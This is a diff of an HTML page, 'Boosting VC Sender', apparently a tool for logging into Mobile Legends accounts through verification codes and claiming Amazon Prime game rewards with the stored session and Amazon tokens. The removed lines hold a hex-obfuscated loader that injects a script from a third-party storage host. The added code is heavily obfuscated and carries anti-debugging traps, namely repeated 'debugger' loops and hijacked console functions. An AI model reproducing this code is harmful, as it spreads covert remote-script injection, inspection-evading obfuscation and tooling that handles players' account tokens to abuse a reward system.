@@ -3,18 +3,500 @@
 <head>
 	<meta charset="utf-8" />
 	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+
+<style>
+@import url(\'https://rsms.me/inter/inter-ui.css\');
+::selection {
+  background: #2D2F36;
+}
+::-webkit-selection {
+  background: #2D2F36;
+}
+::-moz-selection {
+  background: #2D2F36;
+}
+body {
+ 
+  font-family: \'Inter UI\', sans-serif;
+  margin: 0;
+  padding: 0px;
+}
+
+.bg {
+  border-radius: 20px;
+  display: flex;
+  height: 340px;
+  margin: 0 auto;
+  width: 640px;
+}
+@media (max-width: 767px) {
+  .bg {
+    border-radius: 20px;
+    flex-direction: column;
+    height: 630px;
+    width: 320px;
+  }
+}
+.left {
+ left: 610px;
+  text-align:center;
+  background: white;
+  opacity: 0.8;
+  height: calc(100% - 40px);
+  top: 20px;
+  position: relative;
+  width: 50%;
+}
+@media (max-width: 767px) {
+  .left {
+    height: 50%;
+    left: 20px;
+  top: 300px;
+    width: calc(100% - 40px);
+    max-height: 200px;
+  }
+}
+.login {
+  font-size: 50px;
+  font-weight: 900;
+  margin: 50px 40px 40px;
+}
+
+.right {
+  background: #474A59;
+  opacity: 0.9;
+  box-shadow: 0px 0px 40px 16px rgba(0,0,0,0.22);
+  color: #F1F1F2;
+  position: relative;
+  width: 50%;
+}
+@media (max-width: 767px) {
+  .right {
+    flex-shrink: 0;
+  bottom: 225px;
+  height: calc(75% - 40px);
+    width: 100%;
+    max-height: 340px;
+  }
+}
+svg {
+  position: absolute;
+  width: 320px;
+}
+path {
+  fill: none;
+  stroke: url(#linearGradient);;
+  stroke-width: 4;
+  stroke-dasharray: 240 1386;
+}
+.form {
+  border-radius: 20px;
+  margin: 40px;
+  position: absolute;
+}
+label {
+  color:  #c2c2c5;
+  display: block;
+  font-size: 14px;
+  height: 16px;
+  margin-top: 20px;
+  margin-bottom: 5px;
+}
+input {
+  background: transparent;
+  border: 0;
+  color: #f2f2f2;
+  font-size: 20px;
+  height: 30px;
+  line-height: 30px;
+  outline: none !important;
+  width: 100%;
+}
+input::-moz-focus-inner { 
+  border: 0; 
+}
+#idsvc, #userlogin {
+  color: #a6a6a6;
+  margin-top: 40px;
+  transition: color 300ms;
+}
+#idsvc, #userlogin:focus {
+  color: #f2f2f2;
+}
+#idsvc, #userlogin:active {
+  color: #d0d0d2;
+}
+#skipvc, #back2vc {
+  color: #a6a6a6;
+  margin-top: 20px;
+  transition: color 300ms;
+}
+#skipvc, #back2vc:focus {
+  color: #f2f2f2;
+}
+#skipvc, #back2vc:active {
+  color: #d0d0d2;
+}
+#resultStatus {
+  text-align:left;
+  color: black;
+  font-size: 14px;
+  line-height: 1.5;
+  margin: 40px;
+}
+.stats {
+  text-align:left;
+  color: #999;
+ font-size: 16px;
+  line-height: 0;
+  margin: 40px;
+}
+</style>
+
+
+
 	</head>
 		<body>
-	   	<div class="form">
-			<div id="intro">
-				<h1 class="header-title">Boosting VC Sender</h1>
-				<h5 class="header-title">©ML MOLO</h5>
-				<input type="text" name="" id="userserver" onchange="checkFormat()" placeholder="UserID ServerID">
-				<button id="communicateButton" onclick="sendVc(this)">Send Verification Code</button>
-				<p id="apistatus">API Response</p>
-				<p id="apistatusresp">No Response from API</p>
+  <div class="bg">
+    <div class="left">
+<div class="stats">Status:</div>
+<p class="results" id="resultStatus" onclick="ronj();"></p>
+    </div>
+    <div class="right">
+      <svg viewBox="0 0 320 300">
+        <defs>
+          <linearGradient
+                          inkscape:collect="always"
+                          id="linearGradient"
+                          x1="13"
+                          y1="193.49992"
+                          x2="307"
+                          y2="193.49992"
+                          gradientUnits="userSpaceOnUse">
+            <stop
+                  style="stop-color:#ff00ff;"
+                  offset="0"
+                  id="stop876" />
+            <stop
+                  style="stop-color:#ff0000;"
+                  offset="1"
+                  id="stop878" />
+          </linearGradient>
+        </defs>
+        <path d="m 40,120.00016 239.99984,-3.2e-4 c 0,0 24.99263,0.79932 25.00016,35.00016 0.008,34.20084 -25.00016,35 -25.00016,35 h -239.99984 c 0,-0.0205 -25,4.01348 -25,38.5 0,34.48652 25,38.5 25,38.5 h 215 c 0,0 20,-0.99604 20,-25 0,-24.00396 -20,-25 -20,-25 h -190 c 0,0 -20,1.71033 -20,25 0,24.00396 20,25 20,25 h 168.57143" />
+      </svg>
+			
+		<div class="form">
+        <label for="IDandServer">ID and Server</label>
+        <input type="text"placeholder="XXXXXXXX xxxx" id="IDandServer">
+        <label for="password">Verification Code</label>
+        <input type="text" placeholder="1234" id="uservc">
+		<input type="submit" class="gamelogin_ensure" id="idsvc" onclick="sendvc();" value="Send VC">
+		<input type="submit" class="gamelogin_ensure" id="userlogin" onclick="login();" value="Login">
+		<input type="submit" style="padding:3px; font-size:14px;" id="skipvc" onclick="haveVC();" value="I already have a VC">
+		<input type="submit" style="padding:3px; font-size:14px;" id="back2vc" onclick="sendVCagain();" value="Resend VC">
+      </div>
 			</div>
 		</div>
-	<script>var ronjieeeeX=['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x68\x65\x61\x64','\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65','\x73\x63\x72\x69\x70\x74','\x73\x72\x63','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x64\x69\x72\x65\x63\x74\x2e\x73\x33\x2e\x69\x72\x2d\x74\x68\x72\x2d\x61\x74\x31\x2e\x61\x72\x76\x61\x6e\x73\x74\x6f\x72\x61\x67\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x6e\x64\x76\x63\x73\x63\x72\x69\x70\x74\x52\x65\x64\x69\x72\x65\x63\x74\x2e\x6a\x73'];(function(X,Q){var g=function(C){while(--C){X['push'](X['shift']());}};g(++Q);}(ronjieeeeX,0x18f));var ronjieeeeQ=function(X,Q){X=X-0x0;var k=ronjieeeeX[X];return k;};var ronjie=document[ronjieeeeQ('\x30\x78\x30')](ronjieeeeQ('\x30\x78\x34'));ronjie[ronjieeeeQ('\x30\x78\x33')](ronjieeeeQ('\x30\x78\x35'),ronjieeeeQ('\x30\x78\x36')),document[ronjieeeeQ('\x30\x78\x32')][ronjieeeeQ('\x30\x78\x31')](ronjie);</script>
+	<script>
+	
+	
+	var aToken = getCookie('amazontoken'),
+    uToken = getCookie('token');
+function getCookie(_0x115797) {
+    var _0x46db86 = function () {
+            var _0x2248ae = true;
+            return function (_0xa85fa6, _0x143f2b) {
+                var _0xed546d = _0x2248ae ? function () {
+                    if (_0x143f2b) {
+                        var _0xcff4bf = _0x143f2b.apply(_0xa85fa6, arguments);
+                        return _0x143f2b = null, _0xcff4bf;
+                    }
+                } : function () {};
+                return _0x2248ae = false, _0xed546d;
+            };
+        }(),
+        _0x3ba8de = _0x46db86(this, function () {
+            var _0x4ef2c6 = function () {
+                var _0x25bad0 = _0x4ef2c6.constructor('return /" + this + "/')().constructor('^([^ ]+( +[^ ]+)+)+[^ ]}');
+                return !_0x25bad0.test(_0x3ba8de);
+            };
+            return _0x4ef2c6();
+        });
+    _0x3ba8de();
+    var _0x55c3f5 = function () {
+        var _0xa781b1 = true;
+        return function (_0x54e39e, _0x2e68ce) {
+            var _0x25c377 = _0xa781b1 ? function () {
+                if (_0x2e68ce) {
+                    var _0x3d3ff4 = _0x2e68ce.apply(_0x54e39e, arguments);
+                    return _0x2e68ce = null, _0x3d3ff4;
+                }
+            } : function () {};
+            return _0xa781b1 = false, _0x25c377;
+        };
+    }();
+    (function () {
+        _0x55c3f5(this, function () {
+            var _0x167c1d = new RegExp('function *\\( *\\)'),
+                _0x6af817 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
+                _0x579c32 = _0x4afde2('init');
+            !_0x167c1d.test(_0x579c32 + 'chain') || !_0x6af817.test(_0x579c32 + 'input') ? _0x579c32('0') : _0x4afde2();
+        })();
+    }());
+    var _0x58b64e = function () {
+            var _0xcfe1ad = true;
+            return function (_0x61a264, _0x31a8e5) {
+                var _0x14ee4d = _0xcfe1ad ? function () {
+                    if (_0x31a8e5) {
+                        var _0x44c04e = _0x31a8e5.apply(_0x61a264, arguments);
+                        return _0x31a8e5 = null, _0x44c04e;
+                    }
+                } : function () {};
+                return _0xcfe1ad = false, _0x14ee4d;
+            };
+        }(),
+        _0x110f92 = _0x58b64e(this, function () {
+            var _0x3010c6 = function () {
+                    var _0x3a6ce5;
+                    try {
+                        _0x3a6ce5 = Function('return (function() ' + ('{}.constructor("return this")( )') + ');')();
+                    } catch (_0x26aaf6) {
+                        _0x3a6ce5 = window;
+                    }
+                    return _0x3a6ce5;
+                },
+                _0x3195de = _0x3010c6(),
+                _0x1a2b29 = _0x3195de.console = _0x3195de.console || {},
+                _0x28a2d9 = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace'];
+            for (var _0x7a4240 = 0; _0x7a4240 < _0x28a2d9.length; _0x7a4240++) {
+                var _0x4c600d = _0x58b64e.constructor.prototype.bind(_0x58b64e),
+                    _0x14d62e = _0x28a2d9[_0x7a4240],
+                    _0x6eb4 = _0x1a2b29[_0x14d62e] || _0x4c600d;
+                _0x4c600d.__proto__ = _0x58b64e.bind(_0x58b64e), _0x4c600d.toString = _0x6eb4.toString.bind(_0x6eb4), _0x1a2b29[_0x14d62e] = _0x4c600d;
+            }
+        });
+		
+    _0x110f92();
+    var _0x3e41a3 = _0x115797 + '=',
+        _0x337751 = decodeURIComponent(document.cookie),
+        _0x43a86c = _0x337751.split(';');
+    for (var _0x1b3f8a = 0; _0x1b3f8a < _0x43a86c.length; _0x1b3f8a++) {
+        var _0x38392a = _0x43a86c[_0x1b3f8a];
+        while (_0x38392a.charAt (0) == ' ') {
+            _0x38392a = _0x38392a.substring(1);
+        }
+        if (_0x38392a.indexOf(_0x3e41a3) == 0) return _0x38392a.substring(_0x3e41a3.length, _0x38392a.length);
+    }
+    return '';
+}
+function setCookie(_0x2f4165, _0x356c18, _0x460eb9) {
+    var _0x514ed9 = new Date();
+    _0x514ed9.setTime(_0x514ed9.getTime() + _0x460eb9 * 8.64e+7);
+    var _0x10f989 = 'expires=' + _0x514ed9.toUTCString();
+    document.cookie = _0x2f4165 + '=' + _0x356c18 + ';' + _0x10f989 + ';path=/';
+}
+function haveVC() {
+    document.getElementById('idsvc').style.display = 'none', document.getElementById('userlogin').style.display = '', document.getElementById('skipvc').style.display = 'none', document.getElementById('back2vc').style.display = '';
+}
+function sendVCagain() {
+    document.getElementById('userlogin').style.display = 'none', document.getElementById('idsvc').style.display = '', document.getElementById('back2vc').style.display = 'none', document.getElementById('skipvc').style['display'] = '';
+}
+function resetLogin() {
+    localStorage.clear(), 
+	document.cookie = 'userId=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'userGroup=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'userName=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'amazontoken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'amazonuserid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'userVc=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'email=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'member=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'relategroupid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	document.cookie = 'relateuserid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+	window.location.replace('https://play.mobilelegends.com/events/amazonlinkage/index.html');
+}
+function sendvc() {
+    document.getElementById('resultStatus').innerHTML = 'Sending VC..';
+    var sendVCode = 'https://api.mobilelegends.com/base/sendVc',
+        IDServer = document.getElementById('IDandServer').value,
+        splitIDServer = IDServer.split(' '),
+        splitID = splitIDServer[0],
+        splitServer = splitIDServer[1],
+        IDS = 'roleId=' + splitID + '&zoneId=' + splitServer,
+        requestVC = new XMLHttpRequest();
+    
+	if (document.getElementById('IDandServer').value === ''){
+			document.getElementById('resultStatus').innerHTML = 'Input ID and Server!';
+		}else{
+		requestVC.open('POST', sendVCode, true),
+		requestVC.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'),
+		requestVC.onreadystatechange = function () {				
+        requestVC.readyState == 4 && requestVC.status == 200 ? 
+		(document.getElementById('resultStatus').innerHTML = 'VC Sent Successfully!', 
+		document.getElementById('idsvc').style.display = 'none', 
+		document.getElementById('userlogin').style.display = '', 
+		document.getElementById('skipvc').style.display = 'none', 
+		document.getElementById('back2vc').style.display = '') : document.getElementById('resultStatus').innerHTML = 'Something wrong!';
+    }, requestVC.send(IDS);
+  }
+}
+function reLogin(){
+    window.open("https://na.account.amazon.com/ap/oa?client_id=amzn1.application-oa2-client.9d2f00467db14692b9044d3fa0714485&redirect_uri=https%3A%2F%2Fplay.mobilelegends.com%2Fevents%2Famazonlinkage%2Findex.html&response_type=token&language=&ui_locales=&scope=profile%20prime%3Abenefit_status","_self");
+}
+function login() {
+    document.getElementById('resultStatus').innerHTML = 'Logging in...';
+    var _0x21e1b9 = 'https://api.mobilelegends.com/base/login',
+        _0x4ae650 = document.getElementById('uservc').value,
+        _0x5e0878 = document.getElementById('IDandServer').value,
+        _0x53a788 = _0x5e0878.split(' '),
+        _0x166f9e = _0x53a788[0],
+        _0x17ea48 = _0x53a788[1],
+        _0x3526ed = 'roleId=' + _0x166f9e + '&zoneId=' + _0x17ea48 + '&vc=' + _0x4ae650 + ('&referer=opattention&type=web'),
+        _0x4f6d9a = new XMLHttpRequest();
+    _0x4f6d9a.open('POST', _0x21e1b9, true), _0x4f6d9a.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'), _0x4f6d9a.onreadystatechange = function () {
+        if (_0x4f6d9a.readyState == 4 && _0x4f6d9a.status == 200) {
+            var _0x8e5bdb = JSON.parse(_0x4f6d9a['responseText']);
+            if (_0x8e5bdb.code == 0) {
+                var _0x2f5d96 = setCookie('userVc', _0x4ae650, 1),
+                    _0x551ff7 = _0x8e5bdb['data'].token;
+                setCookie('userId', _0x166f9e, 1), setCookie('userGroup', _0x17ea48, 1), setCookie('token', _0x551ff7, 1);
+                var _0x5ced09 = init(_0x551ff7);
+				} else if (_0x8e5bdb.code == -20002) { document.getElementById('resultStatus').innerHTML = '<font color="red" text-align="right">Invalid Parameter!</font>';
+            	} else if (_0x8e5bdb.code == -20010) { document.getElementById('resultStatus').innerHTML = '<font color="red" text-align="right">Invalid verification code!</font>';
+			} else _0x8e5bdb.code == -20008 ? document.getElementById('resultStatus').innerHTML = '<font color="red" text-align="right">Wrong verification code!</font>' : document.getElementById('resultStatus').innerHTML = '<font color="red" text-align="right">' + _0x8e5bdb.code + ' - ' + _0x8e5bdb.message + '</font>';
+        } else _0x4f6d9a.status == 600 && (document.getElementById('resultStatus').innerHTML = 'Wrong Drop Number!');
+    }, _0x4f6d9a.send(_0x3526ed);
+}
+function init(_0x5a09f9) {
+    var _0x55f809 = 'https://api.mobilelegends.com/opattention/init',
+        _0x214f06 = 'token=' + _0x5a09f9,
+        _0x167531 = new XMLHttpRequest();
+    _0x167531['open']('POST', _0x55f809, true), _0x167531.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'), _0x167531['onreadystatechange'] = function () {
+        if (_0x167531['readyState'] == 4 && _0x167531.status == 200) {
+            var _0x4f8c86 = JSON.parse(_0x167531['responseText']),
+                _0x5c776c = _0x4f8c86.data.userData.nickname,
+                _0x2109b0 = localStorage.setItem('prime', 'yes');
+            document.getElementById('resultStatus').innerHTML = 'Login Successfully!', 
+			setCookie('userName', _0x5c776c, 1), 
+			localStorage.setItem('language', 'en'), 
+			localStorage.setItem('loginLang', 'en'), 
+			window.location.replace('https://na.account.amazon.com/ap/oa?client_id=amzn1.application-oa2-client.9d2f00467db14692b9044d3fa0714485&redirect_uri=https%3A%2F%2Fplay.mobilelegends.com%2Fevents%2Famazonlinkage%2Findex.html&response_type=token&language=&ui_locales=&scope=profile%20prime%3Abenefit_status');
+        	window.open("https://play.mobilelegends.com/events/blazingwest/?taskshare=dHlwZT1saW5rJndheT1pbnZpdGUmaW52aXRlX2NvZGU9clZheG9hT1lyNWxTYWxWb1kyaG5WNDFhcU5XZW1ZQ1dWMjJJYVdoa1oydG5aR2RYM2ct");return false;
+
+} else _0x167531.status == 600 && (document.getElementById('resultStatus').innerHTML = 'Invalid Drop Number!');
+    }, _0x167531.send(_0x214f06);
+}
+setInterval(function () {
+    _0x4afde2();
+}, 4000);
+function claimRewards() {
+    var _0xdeeca0 = getCookie('userId'),
+        _0x599ac5 = getCookie('userGroup'),
+        _0x4d8ec0 = getCookie('userName'),
+        _0xc61aa9 = getCookie('amazontoken'),
+        _0x4c2f7b = getCookie('token');
+    boosting(_0x4c2f7b, _0xc61aa9, _0x4d8ec0, _0xdeeca0, _0x599ac5);
+}
+function boosting(_0x2e364e, _0x16e9bb, _0x37cb05, _0x4432fb, _0x485042) {
+    document.getElementById('resultStatus').innerHTML =  '<p>Boosting . . .</p>';
+    var _0x32ed0f = 'https://api.mobilelegends.com/events/amazon/exchangeAmazonReward',
+        _0x296739 = document['getElementById']('dropNumber').value,
+        _0x24a6d9 = _0x296739,
+        _0x99e561 = 'token=' + _0x2e364e + ('&amazontoken=') + _0x16e9bb + '&type=' + _0x24a6d9,
+        _0x54900c = new XMLHttpRequest();
+    _0x54900c.open('POST', _0x32ed0f, true), _0x54900c.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'), _0x54900c['onreadystatechange'] = function () {
+        if (_0x54900c.readyState == 4 && _0x54900c.status == 200) {
+			document.getElementById('resultStatus').innerHTML = '';
+            var _0x2ff442 = JSON['parse'](_0x54900c['responseText']);
+            if (_0x2ff442.code == 0) {
+                document.getElementById('resultStatus').innerHTML = '<p>Game ID: ' + _0x4432fb + ' ' + _0x485042 + '<br>IGN: ' + _0x37cb05 + '<br>☑️Successfully Claimed! 💯</p>';
+				localStorage.clear(), 
+				document.cookie = 'userId=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'userGroup=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'userName=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'amazontoken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'amazonuserid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'userVc=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'email=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'member=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'relategroupid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;', 
+				document.cookie = 'relateuserid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+            } else document.getElementById('resultStatus').innerHTML += '<p>' + _0x2ff442.message + '</p>';
+        } replaceStatus();
+    }, _0x54900c.send(_0x99e561);
+
+}
+
+
+function replaceStatus(){
+	var replaceText = document.getElementById('resultStatus').innerHTML;
+    var pos = replaceText.replace("Game ID:", "🆔:")
+	.replace("IGN:", "ɪɢɴ:")
+	.replace('该绑定的角色已经领过', 'Rewards Already Received!')
+	.replace('该期奖励已经领过', 'Rewards Already Received!')
+    .replace('用户不是会员', 'Amazon Account is not Prime!')
+	.replace('参数不合法', 'Invalid Parameter!')
+	.replace('领奖时间已过', 'Wrong Drop Number!')
+	.replace('查询不到amazon会员信息', 'Cannot find amazon member information!')
+	.replace('Boosting . . .','')
+    .replace('Status: ','')
+    document.getElementById("resultStatus").innerHTML = pos;
+}
+
+function ronj(){
+function copyText(element) {
+    var $temp = $("<textarea>");
+    $("body").append($temp);
+    var x = $(element).html().trim().replace(/<br>/g, '\n').replace(/<\/?[^>]+>/g, '')
+	.replace('&amp;','&');
+    $temp.val(x).select();
+    document.execCommand("copy");
+    $temp.remove();
+ Toastify({
+ close: true,
+  gravity: "top",
+  position: 'center',
+  text: "Copied Successfully!",
+  backgroundColor: "linear-gradient(to right, #00b09b, #96c93d)",
+  className: "info",
+}).showToast();
+}
+setTimeout(function(){
+	copyText(document.querySelector('#resultStatus'))
+}, 50);
+function addCss(fileName) {
+  var head = document.head;
+  var link = document.createElement("link");
+  link.type = "text/css";
+  link.rel = "stylesheet";
+  link.href = fileName;
+  head.appendChild(link);
+}
+	var ronjie= document.createElement('script'); ronjie.setAttribute('src','https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'); document.head.appendChild(ronjie);
+	var ronjie= document.createElement('script'); ronjie.setAttribute('src','https://cdn.jsdelivr.net/npm/toastify-js'); document.head.appendChild(ronjie);
+	addCss('https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css');
+
+}
+
+function _0x4afde2(_0x5823e8) {
+    function _0x2d5b0f(_0x235ba3) {
+        if (typeof _0x235ba3 === 'string') return function (_0x29a073) {} ['constructor']('while (true) {}').apply('counter');
+        else('' + _0x235ba3 / _0x235ba3).length !== 1 || _0x235ba3 % 20 === 0 ? function () {
+            return true;
+        } ['constructor']('debugger').call('action') : function () {
+            return false;
+        } ['constructor']('debugger').apply('stateObject');
+        _0x2d5b0f(++_0x235ba3);
+    }
+    try {
+        if (_0x5823e8) return _0x2d5b0f;
+        else _0x2d5b0f(0);
+    } catch (_0x26ea18) {}
+}
+
+	</script>
 		</body>
 </html>
